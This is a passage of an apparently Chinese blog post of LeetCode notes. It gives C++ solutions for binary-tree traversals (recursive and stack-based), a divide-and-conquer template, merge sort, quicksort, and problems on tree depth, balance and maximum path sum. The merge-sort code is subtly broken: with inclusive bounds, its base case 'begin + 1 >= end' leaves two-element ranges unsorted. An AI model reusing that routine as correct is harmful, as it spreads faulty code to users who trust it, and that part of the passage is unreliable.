class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode *cur=root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>||!st.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="literal">NULL</span>)</span><br><span class="line">            {</span><br><span class="line">                ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                st.<span class="built_in">push</span>(cur);</span><br><span class="line">                cur=cur-&gt;left;</span><br><span class="line">            }</span><br><span class="line">            cur=st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            cur=cur-&gt;right;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>也可以这么写</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!st.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">auto</span> cur=st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">            ans.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                st.<span class="built_in">push</span>(cur-&gt;right);</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                st.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>例题：<a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">https://leetcode-cn.com/problems/binary-tree-inorder-traversal/</a></p><h5 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:   </span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;       </span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root-&gt;left);</span><br><span class="line">        ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">       </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="后序遍历："><a href="#后序遍历：" class="headerlink" title="后序遍历："></a>后序遍历：</h4><p>例题：<a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">https://leetcode-cn.com/problems/binary-tree-postorder-traversal/</a></p><h5 id="递归："><a href="#递归：" class="headerlink" title="递归："></a>递归：</h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> ans;</span><br><span class="line">        <span class="built_in">postorderTraversal</span>(root-&gt;left);</span><br><span class="line">        <span class="built_in">postorderTraversal</span>(root-&gt;right);</span><br><span class="line">        ans.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="分治法应用"><a href="#分治法应用" class="headerlink" title="分治法应用"></a>分治法应用</h3><p>先分别处理局部，再合并结果</p><p>适用场景</p><ul><li>快速排序</li><li>归并排序</li><li>二叉树相关问题</li></ul><p>分治法模板</p><ul><li>递归返回条件</li><li>分段处理</li><li>合并结果</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ResultType <span class="title">traversal</span><span class="params">(TreeNode *root)</span> </span>{</span><br><span class="line">    <span class="comment">// nil or leaf</span></span><br><span class="line">    <span class="keyword">if</span> (!root) {</span><br><span class="line">        <span class="comment">// do something and return</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Divide</span></span><br><span class="line">    <span class="keyword">auto</span> left = <span class="built_in">traversal</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">auto</span> right = <span class="built_in">traversal</span>(root-&gt;right);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Conquer</span></span><br><span class="line">    <span class="keyword">auto</span> result = <span class="built_in">merge</span>(left, right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="典型示例"><a href="#典型示例" class="headerlink" title="典型示例"></a>典型示例</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// V2：通过分治法遍历二叉树</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preOrderTraversal</span><span class="params">(TreeNode *root)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">divideAndConquer</span>(root);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">divideAndConquer</span><span class="params">(TreeNode *root)</span> </span>{</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">    <span class="keyword">if</span> (!root) {</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 分治(Divide)</span></span><br><span class="line">    <span class="keyword">auto</span> left = <span class="built_in">divideAndConquer</span>(root-&gt;left);</span><br><span class="line">    <span class="keyword">auto</span> right = <span class="built_in">divideAndConquer</span>(root-&gt;right);</span><br><span class="line">    <span class="comment">// 合并结果(Conquer)</span></span><br><span class="line">    result.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">    result.<span class="built_in">insert</span>(result.<span class="built_in">end</span>(), left.<span class="built_in">begin</span>(), left.<span class="built_in">end</span>());</span><br><span class="line">    result.<span class="built_in">insert</span>(result.<span class="built_in">end</span>(), right.<span class="built_in">begin</span>(), right.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">MergeSort</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> tmp = <span class="keyword">new</span> T[len];</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, <span class="number">0</span>, len - <span class="number">1</span>, tmp);</span><br><span class="line">    <span class="keyword">delete</span>[] tmp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">mergeSort</span><span class="params">(T arr[], <span class="type">int</span> begin, <span class="type">int</span> end, T tmp[])</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (begin + <span class="number">1</span> &gt;= end) {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> mid = begin + (end - begin) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">auto</span> begin1 = begin;</span><br><span class="line">    <span class="keyword">auto</span> end1 = mid;</span><br><span class="line">    <span class="keyword">auto</span> begin2 = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">auto</span> end2 = end;</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, begin1, end1, tmp);</span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, begin2, end2, tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// merge two parts</span></span><br><span class="line">    <span class="keyword">auto</span> index = begin;</span><br><span class="line">    <span class="keyword">while</span> (begin1 &lt;= end1 &amp;&amp; begin2 &lt;= end2) {</span><br><span class="line">        tmp[index++] = arr[begin1] &lt; arr[begin2] ? arr[begin1++] : arr[begin2++];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (begin1 &lt;= end1) {</span><br><span class="line">        tmp[index++] = arr[begin1++];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (begin2 &lt;= end2) {</span><br><span class="line">        tmp[index++] = arr[begin2++];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = begin; i &lt;= end; ++i) {</span><br><span class="line">        arr[i] = tmp[i];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">QuickSort</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>{</span><br><span class="line">    <span class="built_in">quickSort</span>(arr, <span class="number">0</span>, len - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quickSort</span><span class="params">(T arr[], <span class="type">int</span> begin, <span class="type">int</span> end)</span> </span>{</span><br><span class="line">    <span class="keyword">if</span> (begin &gt;= end) {</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">auto</span> pivot = <span class="built_in">partition</span>(arr, begin, end);</span><br><span class="line">    <span class="built_in">quickSort</span>(arr, begin, pivot - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">quickSort</span>(arr, pivot + <span class="number">1</span>, end);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">partition</span><span class="params">(T arr[], <span class="type">int</span> begin, <span class="type">int</span> end)</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> base = arr[end];</span><br><span class="line">    <span class="keyword">auto</span> lessInsert = begin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = begin; i &lt; end; ++i) {</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; base) {</span><br><span class="line">            <span class="built_in">swap</span>(arr[lessInsert++], arr[i]);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">swap</span>(arr[lessInsert], arr[end]);</span><br><span class="line">    <span class="keyword">return</span> lessInsert;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="常见题目示例"><a href="#常见题目示例" class="headerlink" title="常见题目示例"></a>常见题目示例</h4><h5 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></h5><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> left=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> right=<span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">             <span class="keyword">return</span> left<span class="number">+1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> right<span class="number">+1</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="110-平衡二叉树"><a href="#110-平衡二叉树" class="headerlink" title="110. 平衡二叉树"></a><a href="https://leetcode-cn.com/problems/balanced-binary-tree/">110. 平衡二叉树</a></h5><blockquote><p>给定一个二叉树，判断它是否是高度平衡的二叉树。</p><p>本题中，一棵高度平衡二叉树定义为：</p><p>一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。</p><p>示例 1:</p><p>给定二叉树 [3,9,20,null,null,15,7]</p><p> 3<br>/ <br>9  20<br> /  <br>15   7<br>返回 true 。</p><p>示例 2:</p><p>给定二叉树 [1,2,2,3,3,null,null,4,4]</p><pre><code>1</code></pre><p>   / <br>  2   2<br> / <br>3   3<br>/ <br>4   4<br>返回 false 。</p></blockquote><h6 id="从底至顶"><a href="#从底至顶" class="headerlink" title="从底至顶"></a>从底至顶</h6><p>思路：分治法，左边平衡 &amp;&amp; 右边平衡 &amp;&amp; 左右两边高度 &lt;= 1， 因为需要返回是否平衡及高度，要么返回两个数据，要么合并两个数据， 所以用-1 表示不平衡，&gt;0 表示树高度（二义性：一个变量有两种含义）。</p><p>注意</p><blockquote><p>一般工程中，结果通过两个变量来返回，不建议用一个变量表示两种含义</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isBalanced</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">maxDepth</span>(root)==<span class="number">-1</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode *root)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">      <span class="type">int</span> left=<span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">      <span class="type">int</span> right=<span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">      <span class="keyword">if</span>(left==<span class="number">-1</span>||right==<span class="number">-1</span>||left-right&gt;<span class="number">1</span>||right-left&gt;<span class="number">1</span>)</span><br><span class="line">      {</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">      {</span><br><span class="line">          <span class="keyword">return</span> left<span class="number">+1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">return</span> right<span class="number">+1</span>;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="124-二叉树中的最大路径和"><a href="#124-二叉树中的最大路径和" class="headerlink" title="124. 二叉树中的最大路径和"></a><a href="https://leetcode-cn.com/problems/binary-tree-maximum-path-sum/">124. 二叉树中的最大路径和</a></h5><blockquote><p>给定一个非空二叉树，返回其最大路径和。</p><p>本题中，路径被定义为一条从树中任意节点出发，达到任意节点的序列。该路径至少包含一个节点，且不一定经过根节点。</p><p>示例 1:</p><p>输入: [1,2,3]</p><pre><code>1</code></pre><p>   / <br>  2   3</p><p>输出: 6<br>示例 2:</p><p>输入: [-10,9,20,null,null,15,7]</p><p>-10<br>/ <br>9  20<br> /  <br>15   7</p><p>输出: 42</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode* root)</span> </span>{</span><br><span class="line">        <span class="type">int</span> res=INT_MIN;</span><br><span class="line">        <span class="built_in">helper</span>(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(TreeNode*root,<span class="type">int</span> &amp;val)</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> left=<span class="built_in">max</span>(<span class="number">0</span>,<span class="built_in">helper</span>(root-&gt;left,val));</span><br><span class="line">        <span class="type">int</span> right=<span class="built_in">max</span>(<span class="number">0</span>,<span class="built_in">helper</span>(root-&gt;right,val));</span><br><span class="line">        <span class="type">int</span> lmr=root-&gt;val+left+right;</span><br><span class="line">        <span class="type">int</span> ret=root-&gt;val+<span class="built_in">max</span>(left,right);</span><br><span class="line">        val=<span class="built_in">max</span>(val,<span class="built_in">max</span>(lmr,ret));</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"></span><br><span 